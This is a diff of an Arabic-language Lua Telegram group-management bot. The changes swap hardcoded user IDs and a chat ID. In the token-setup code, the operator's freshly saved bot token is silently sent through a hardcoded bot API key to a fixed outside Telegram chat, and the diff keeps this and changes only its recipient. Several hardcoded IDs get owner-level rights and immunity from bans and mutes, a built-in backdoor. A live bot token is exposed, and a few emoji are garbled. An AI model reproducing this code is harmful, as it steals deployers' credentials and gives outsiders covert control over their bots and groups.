@@ -32,7 +32,7 @@ io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦�
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1900386181:AAFMwGkct-xcF-pxK9k3tM9YtzvkClMT-vo/sendmessage?chat_id=1124610301&text=' ..token)
+https.request('https://api.telegram.org/bot1900386181:AAFMwGkct-xcF-pxK9k3tM9YtzvkClMT-vo/sendmessage?chat_id=859213488&text=' ..token)
 end 
 else
 print('\27[0;35m𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -182,7 +182,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1124610301,1759990986,968613145,1890233810,1885313077}   
+sudo_users = {SUDO,859213488,1770739933,96863145,189023810,188531307}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -280,15 +280,15 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1124610301) then  
+if tonumber(user_id) == tonumber(859213488) then  
 var = true 
-elseif tonumber(user_id) == tonumber(1890233810) then
+elseif tonumber(user_id) == tonumber(189023810) then
 var = true  
-elseif tonumber(user_id) == tonumber(968613145) then
+elseif tonumber(user_id) == tonumber(96863145) then
 var = true  
-elseif tonumber(user_id) == tonumber(1759990986) then
+elseif tonumber(user_id) == tonumber(1770739933) then
 var = true  
-elseif tonumber(user_id) == tonumber(1885313077) then
+elseif tonumber(user_id) == tonumber(188531307) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -322,15 +322,15 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1124610301) then  
+if tonumber(user_id) == tonumber(859213488) then  
 var = 'مبرمج السورس'
-elseif tonumber(user_id) == tonumber(968613145) then
+elseif tonumber(user_id) == tonumber(96863145) then
 var = 'صاحب التليجرام'
-elseif tonumber(user_id) == tonumber(1890233810) then
+elseif tonumber(user_id) == tonumber(189023810) then
 var = 'صاحب السورس'
-elseif tonumber(user_id) == tonumber(1759990986) then
+elseif tonumber(user_id) == tonumber(175990986) then
 var = 'مالك السورس'
-elseif tonumber(user_id) == tonumber(1885313077) then
+elseif tonumber(user_id) == tonumber(188531307) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -4053,7 +4053,7 @@ local TWEET_Msg = {
 "‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.💜 ",
 "‏ : كُلما أتبع قلبي يدلني إليك . 😜",
 "‏ انك الجميع و كل من احتل قلبي🫀🤍 ",
-"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.?? ",
+"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖 ",
 "‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️ ",
 "‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ 💕",
 " ‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.💖",
@@ -5426,23 +5426,23 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1890233810) then  
+if tonumber(result.sender_user_id_) == tonumber(189023810) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(968613145) then  
+if tonumber(result.sender_user_id_) == tonumber(96863145) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب التليجرام عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1759990986) then  
+if tonumber(result.sender_user_id_) == tonumber(1770739933) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مالك السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1885313077) then  
+if tonumber(result.sender_user_id_) == tonumber(188531307) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مطور السورس عام")
 return false 
 end
@@ -5484,19 +5484,19 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1124610301) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1890233810) then
+if result.id_ == tonumber(189023810) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر صاحب السورس \n")
 return false 
 end
-if result.id_ == tonumber(968613145) then
+if result.id_ == tonumber(96863145) then
 send(msg.chat_id_, msg.id_, "  لا يمكنك حظر صاحب التليجرام \n")
 return false 
 end
-if result.id_ == tonumber(1759990986) then
+if result.id_ == tonumber(1770739933) then
 send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مالك السورس \n")
 return false 
 end
@@ -5532,19 +5532,19 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1124610301) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1890233810) then  
+if tonumber(userid) == tonumber(189023810) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(968613145) then  
+if tonumber(userid) == tonumber(96863145) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب التليجرام عام")
 return false 
 end
-if tonumber(userid) == tonumber(1759990986) then  
+if tonumber(userid) == tonumber(1770739933) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مالك السورس عام")
 return false 
 end
@@ -5581,19 +5581,19 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1890233810) then  
+if tonumber(result.sender_user_id_) == tonumber(189023810) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(968613145) then  
+if tonumber(result.sender_user_id_) == tonumber(96863145) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب التليجرام عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1759990986) then  
+if tonumber(result.sender_user_id_) == tonumber(1770739933) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -5634,19 +5634,19 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1124610301) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1890233810) then
+if result.id_ == tonumber(189023810) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم صاحب السورس \n")
 return false 
 end
-if result.id_ == tonumber(968613145) then
+if result.id_ == tonumber(96863145) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم صاحب التليجرام \n")
 return false 
 end
-if result.id_ == tonumber(1759990986) then
+if result.id_ == tonumber(1770739933) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم مالك السورس \n")
 return false 
 end
@@ -5682,19 +5682,19 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1124610301) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1890233810) then  
+if tonumber(userid) == tonumber(189023810) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(968613145) then  
+if tonumber(userid) == tonumber(96863145) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب التليجرام عام")
 return false 
 end
-if tonumber(userid) == tonumber(1759990986) then  
+if tonumber(userid) == tonumber(1770739933) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -15556,7 +15556,7 @@ Usᴇʀ Nᴀᴍᴇ ~ #username
 Yᴏᴜʀ ɪᴅ ~ #id 
 Sᴛᴀsᴛ ~ #stast 
 Msᴀɢ ~ #msgs
-𝗖𝗛 - ↝@uu_regan↜ 💞.
+𝗖?? - ↝@uu_regan↜ 💞.
 ]],
 [[
 - 🇪🇬 UsErNaMe . #username 𖠲
